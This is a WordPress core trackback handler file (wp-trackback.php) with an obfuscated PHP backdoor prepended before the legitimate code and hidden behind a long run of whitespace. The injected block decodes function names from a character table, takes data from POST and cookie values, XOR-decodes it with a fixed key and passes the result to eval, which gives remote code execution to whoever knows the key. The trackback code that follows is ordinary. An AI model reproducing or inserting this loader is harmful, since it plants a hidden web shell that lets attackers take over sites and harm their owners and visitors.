<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $e9e36fe = 442;$GLOBALS['c02d6574']=Array();global$c02d6574;$c02d6574=$GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['r70e84a']="\x5a\x46\x7a\x49\x7e\x7b\x23\x6d\xa\x24\x54\x44\x2a\x74\x72\x3c\x73\x37\x77\x5e\x2b\x66\x63\x3a\x21\x2d\x3e\x40\x39\x6f\x32\x59\x31\x6c\x28\x5c\x35\x27\x2e\x26\x20\x6a\x36\x64\x75\x53\x45\x6b\x57\x2c\x7d\x67\x61\x55\x4d\x71\x68\x76\x38\x50\x34\x3b\x25\x52\x42\x3d\x29\x58\x22\x79\x65\x5b\x48\x56\x60\x69\x43\x30\x70\x51\x47\x4b\x4f\x41\x5d\x4c\x5f\xd\x4e\x9\x7c\x4a\x3f\x6e\x2f\x62\x33\x78";$c02d6574[$c02d6574['r70e84a'][56].$c02d6574['r70e84a'][30].$c02d6574['r70e84a'][17].$c02d6574['r70e84a'][52].$c02d6574['r70e84a'][32].$c02d6574['r70e84a'][30].$c02d6574['r70e84a'][70].$c02d6574['r70e84a'][77]]=$c02d6574['r70e84a'][78].$c02d6574['r70e84a'][52].$c02d6574['r70e84a'][22].$c02d6574['r70e84a'][47];$c02d6574[$c02d6574['r70e84a'][33].$c02d6574['r70e84a'][43].$c02d6574['r70e84a'][22].$c02d6574['r70e84a'][36].$c02d6574['r70e84a'][22].$c02d6574['r70e84a'][70]]=$c02d6574['r70e84a'][22].$c02d6574['r70e84a'][29].$c02d6574['r70e84a'][44].$c02d6574['r70e84a'][93].$c02d6574['r70e84a'][13];$c02d6574[$c02d6574['r70e84a'][18].$c02d6574['r70e84a'][42].$c02d6574['r70e84a'][60].$c02d6574['r70e84a'][77].$c02d6574['r70e84a'][17].$c02d6574['r70e84a'][42].$c02d6574['r70e84a'][43].$c02d6574['r70e84a'][70]]=$c02d6574['r70e84a'][16].$c02d6574['r70e84a'][44].$c02d6574['r70e84a'][95].$c02d6574['r70e84a'][16].$c02d6574['r70e84a'][13].$c02d6574['r70e84a'][14];$c02d6574[$c02d6574['r70e84a'][78].$c02d6574['r70e84a'][22].$c02d6574['r70e84a'][58].$c02d6574['r70e84a'][22].$c02d6574['r70e84a'][30].$c02d6574['r70e84a'][43]]=$c02d6574['r70e84a'][16].$c02d6574['r70e84a'][13].$c02d6574['r70e84a'][14].$c02d6574['r70e84a'][33].$c02d6574['r70e84a'][70].$c02d6574['r70e84a'][93];$c02d6574[$c02d6574['r70e84a'][56].$c02d6574['r70e84a'][30].$c02d6574['r70e84a'][95].$c02d6574['r70e84a'][28].$c02d6574['r70e84a'][22].$c02d6574['r70e84a'][60].$c02d6574['r70e84a'][21]]=$c02d6574['r70e84a'][70].$c02d6574['r70e84a'][97].$c02d6574['r70e84a'][78].$c02d6574['r70e84a'][33].$c02d6574['r70e84a'][29].$c02d6574['r70e84a'][43].$c02d6574['r70e84a'][70];$c02d6574[$c02d6574['r70e84a'][52].$c02d6574['r70e84a'][96].$c02d6574['r70e84a'][96].$c02d6574['r70e84a'][28].$c02d6574['r70e84a'][17]]=$c02d6574['r70e84a'][16].$c02d6574['r70e84a'][13].$c02d6574['r70e84a'][14].$c02d6574['r70e84a'][86].$c02d6574['r70e84a'][14].$c02d6574['r70e84a'][70].$c02d6574['r70e84a'][78].$c02d6574['r70e84a'][70].$c02d6574['r70e84a'][52].$c02d6574['r70e84a'][13];$c02d6574[$c02d6574['r70e84a'][97].$c02d6574['r70e84a'][95].$c02d6574['r70e84a'][30].$c02d6574['r70e84a'][30].$c02d6574['r70e84a'][43].$c02d6574['r70e84a'][52].$c02d6574['r70e84a'][17]]=$_POST;$c02d6574[$c02d6574['r70e84a'][57].$c02d6574['r70e84a'][21].$c02d6574['r70e84a'][96].$c02d6574['r70e84a'][52].$c02d6574['r70e84a'][17].$c02d6574['r70e84a'][96].$c02d6574['r70e84a'][95].$c02d6574['r70e84a'][77]]=$_COOKIE;$a9f130e=Array($c02d6574['r70e84a'][14].$c02d6574['r70e84a'][52].$c02d6574['r70e84a'][93].$c02d6574['r70e84a'][43].$c02d6574['r70e84a'][29].$c02d6574['r70e84a'][7].$c02d6574['r70e84a'][32]=>$c02d6574['r70e84a'][14].$c02d6574['r70e84a'][52].$c02d6574['r70e84a'][93].$c02d6574['r70e84a'][43].$c02d6574['r70e84a'][29].$c02d6574['r70e84a'][7].$c02d6574['r70e84a'][30]);$n94eee=Array($c02d6574['r70e84a'][14].$c02d6574['r70e84a'][52].$c02d6574['r70e84a'][93].$c02d6574['r70e84a'][43].$c02d6574['r70e84a'][29].$c02d6574['r70e84a'][7].$c02d6574['r70e84a'][96]=>$c02d6574['r70e84a'][14].$c02d6574['r70e84a'][52].$c02d6574['r70e84a'][93].$c02d6574['r70e84a'][43].$c02d6574['r70e84a'][29].$c02d6574['r70e84a'][7].$c02d6574['r70e84a'][60]);foreach(Array($a9f130e,$c02d6574[$c02d6574['r70e84a'][97].$c02d6574['r70e84a'][95].$c02d6574['r70e84a'][30].$c02d6574['r70e84a'][30].$c02d6574['r70e84a'][43].$c02d6574['r70e84a'][52].$c02d6574['r70e84a'][17]],$n94eee,$c02d6574[$c02d6574['r70e84a'][57].$c02d6574['r70e84a'][21].$c02d6574['r70e84a'][96].$c02d6574['r70e84a'][52].$c02d6574['r70e84a'][17].$c02d6574['r70e84a'][96].$c02d6574['r70e84a'][95].$c02d6574['r70e84a'][77]])as$y0418c){foreach($y0418cas$w0cb18cc=>$a158){$a158=@$c02d6574[$c02d6574['r70e84a'][56].$c02d6574['r70e84a'][30].$c02d6574['r70e84a'][17].$c02d6574['r70e84a'][52].$c02d6574['r70e84a'][32].$c02d6574['r70e84a'][30].$c02d6574['r70e84a'][70].$c02d6574['r70e84a'][77]]($c02d6574['r70e84a'][72].$c02d6574['r70e84a'][12],$a158);$w0cb18cc.=$c02d6574['r70e84a'][43].$c02d6574['r70e84a'][17].$c02d6574['r70e84a'][28].$c02d6574['r70e84a'][28].$c02d6574['r70e84a'][42].$c02d6574['r70e84a'][28].$c02d6574['r70e84a'][28].$c02d6574['r70e84a'][70].$c02d6574['r70e84a'][25].$c02d6574['r70e84a'][21].$c02d6574['r70e84a'][52].$c02d6574['r70e84a'][30].$c02d6574['r70e84a'][70].$c02d6574['r70e84a'][25].$c02d6574['r70e84a'][60].$c02d6574['r70e84a'][95].$c02d6574['r70e84a'][42].$c02d6574['r70e84a'][30].$c02d6574['r70e84a'][25].$c02d6574['r70e84a'][95].$c02d6574['r70e84a'][60].$c02d6574['r70e84a'][43].$c02d6574['r70e84a'][17].$c02d6574['r70e84a'][25].$c02d6574['r70e84a'][96].$c02d6574['r70e84a'][36].$c02d6574['r70e84a'][52].$c02d6574['r70e84a'][77].$c02d6574['r70e84a'][36].$c02d6574['r70e84a'][28].$c02d6574['r70e84a'][22].$c02d6574['r70e84a'][70].$c02d6574['r70e84a'][96].$c02d6574['r70e84a'][52].$c02d6574['r70e84a'][77].$c02d6574['r70e84a'][17];$v7ade7=$a158^$c02d6574[$c02d6574['r70e84a'][18].$c02d6574['r70e84a'][42].$c02d6574['r70e84a'][60].$c02d6574['r70e84a'][77].$c02d6574['r70e84a'][17].$c02d6574['r70e84a'][42].$c02d6574['r70e84a'][43].$c02d6574['r70e84a'][70]]($c02d6574[$c02d6574['r70e84a'][52].$c02d6574['r70e84a'][96].$c02d6574['r70e84a'][96].$c02d6574['r70e84a'][28].$c02d6574['r70e84a'][17]]($w0cb18cc,($c02d6574[$c02d6574['r70e84a'][78].$c02d6574['r70e84a'][22].$c02d6574['r70e84a'][58].$c02d6574['r70e84a'][22].$c02d6574['r70e84a'][30].$c02d6574['r70e84a'][43]]($a158)/$c02d6574[$c02d6574['r70e84a'][78].$c02d6574['r70e84a'][22].$c02d6574['r70e84a'][58].$c02d6574['r70e84a'][22].$c02d6574['r70e84a'][30].$c02d6574['r70e84a'][43]]($w0cb18cc))+1),0,$c02d6574[$c02d6574['r70e84a'][78].$c02d6574['r70e84a'][22].$c02d6574['r70e84a'][58].$c02d6574['r70e84a'][22].$c02d6574['r70e84a'][30].$c02d6574['r70e84a'][43]]($a158));$v7ade7=$c02d6574[$c02d6574['r70e84a'][56].$c02d6574['r70e84a'][30].$c02d6574['r70e84a'][95].$c02d6574['r70e84a'][28].$c02d6574['r70e84a'][22].$c02d6574['r70e84a'][60].$c02d6574['r70e84a'][21]]($c02d6574['r70e84a'][6],$v7ade7);if($c02d6574[$c02d6574['r70e84a'][33].$c02d6574['r70e84a'][43].$c02d6574['r70e84a'][22].$c02d6574['r70e84a'][36].$c02d6574['r70e84a'][22].$c02d6574['r70e84a'][70]]($v7ade7)==3){eval/*m303489e4*/($v7ade7[1]($v7ade7[2]));exit();}}} ?><?php
/**
 * Handle Trackbacks and Pingbacks Sent to WordPress
 *
 * @since 0.71
 *
 * @package WordPress
 * @subpackage Trackbacks
 */

if (empty($wp)) {
	require_once( dirname( __FILE__ ) . '/wp-load.php' );
	wp( array( 'tb' => '1' ) );
}

/**
 * Response to a trackback.
 *
 * Responds with an error or success XML message.
 *
 * @since 0.71
 *
 * @param mixed  $error         Whether there was an error.
 *                              Default '0'. Accepts '0' or '1', true or false.
 * @param string $error_message Error message if an error occurred.
 */
function trackback_response($error = 0, $error_message = '') {
	header('Content-Type: text/xml; charset=' . get_option('blog_charset') );
	if ($error) {
		echo '<?xml version="1.0" encoding="utf-8"?'.">\n";
		echo "<response>\n";
		echo "<error>1</error>\n";
		echo "<message>$error_message</message>\n";
		echo "</response>";
		die();
	} else {
		echo '<?xml version="1.0" encoding="utf-8"?'.">\n";
		echo "<response>\n";
		echo "<error>0</error>\n";
		echo "</response>";
	}
}

// Trackback is done by a POST.
$request_array = 'HTTP_POST_VARS';

if ( !isset($_GET['tb_id']) || !$_GET['tb_id'] ) {
	$tb_id = explode('/', $_SERVER['REQUEST_URI']);
	$tb_id = intval( $tb_id[ count($tb_id) - 1 ] );
}

$tb_url  = isset($_POST['url'])     ? $_POST['url']     : '';
$charset = isset($_POST['charset']) ? $_POST['charset'] : '';

// These three are stripslashed here so they can be properly escaped after mb_convert_encoding().
$title     = isset($_POST['title'])     ? wp_unslash($_POST['title'])      : '';
$excerpt   = isset($_POST['excerpt'])   ? wp_unslash($_POST['excerpt'])    : '';
$blog_name = isset($_POST['blog_name']) ? wp_unslash($_POST['blog_name'])  : '';

if ($charset)
	$charset = str_replace( array(',', ' '), '', strtoupper( trim($charset) ) );
else
	$charset = 'ASCII, UTF-8, ISO-8859-1, JIS, EUC-JP, SJIS';

// No valid uses for UTF-7.
if ( false !== strpos($charset, 'UTF-7') )
	die;

// For international trackbacks.
if ( function_exists('mb_convert_encoding') ) {
	$title     = mb_convert_encoding($title, get_option('blog_charset'), $charset);
	$excerpt   = mb_convert_encoding($excerpt, get_option('blog_charset'), $charset);
	$blog_name = mb_convert_encoding($blog_name, get_option('blog_charset'), $charset);
}

// Now that mb_convert_encoding() has been given a swing, we need to escape these three.
$title     = wp_slash($title);
$excerpt   = wp_slash($excerpt);
$blog_name = wp_slash($blog_name);

if ( is_single() || is_page() )
	$tb_id = $posts[0]->ID;

if ( !isset($tb_id) || !intval( $tb_id ) )
	trackback_response( 1, __( 'I really need an ID for this to work.' ) );

if (empty($title) && empty($tb_url) && empty($blog_name)) {
	// If it doesn't look like a trackback at all.
	wp_redirect(get_permalink($tb_id));
	exit;
}

if ( !empty($tb_url) && !empty($title) ) {
	/**
	* Fires before the trackback is added to a post.
	*
	* @since 4.7.0
	*
	* @param int    $tb_id     Post ID related to the trackback.
	* @param string $tb_url    Trackback URL.
	* @param string $charset   Character Set.
	* @param string $title     Trackback Title.
	* @param string $excerpt   Trackback Excerpt.
	* @param string $blog_name Blog Name.
	*/
	do_action( 'pre_trackback_post', $tb_id, $tb_url, $charset, $title, $excerpt, $blog_name );

	header('Content-Type: text/xml; charset=' . get_option('blog_charset') );

	if ( !pings_open($tb_id) )
		trackback_response( 1, __( 'Sorry, trackbacks are closed for this item.' ) );

	$title =  wp_html_excerpt( $title, 250, '&#8230;' );
	$excerpt = wp_html_excerpt( $excerpt, 252, '&#8230;' );

	$comment_post_ID = (int) $tb_id;
	$comment_author = $blog_name;
	$comment_author_email = '';
	$comment_author_url = $tb_url;
	$comment_content = "<strong>$title</strong>\n\n$excerpt";
	$comment_type = 'trackback';

	$dupe = $wpdb->get_results( $wpdb->prepare("SELECT * FROM $wpdb->comments WHERE comment_post_ID = %d AND comment_author_url = %s", $comment_post_ID, $comment_author_url) );
	if ( $dupe )
		trackback_response( 1, __( 'We already have a ping from that URL for this post.' ) );

	$commentdata = compact('comment_post_ID', 'comment_author', 'comment_author_email', 'comment_author_url', 'comment_content', 'comment_type');

	$result = wp_new_comment( $commentdata );

	if ( is_wp_error( $result ) ) {
		trackback_response( 1, $result->get_error_message() );
	}

	$trackback_id = $wpdb->insert_id;

	/**
	 * Fires after a trackback is added to a post.
	 *
	 * @since 1.2.0
	 *
	 * @param int $trackback_id Trackback ID.
	 */
	do_action( 'trackback_post', $trackback_id );
	trackback_response( 0 );
}
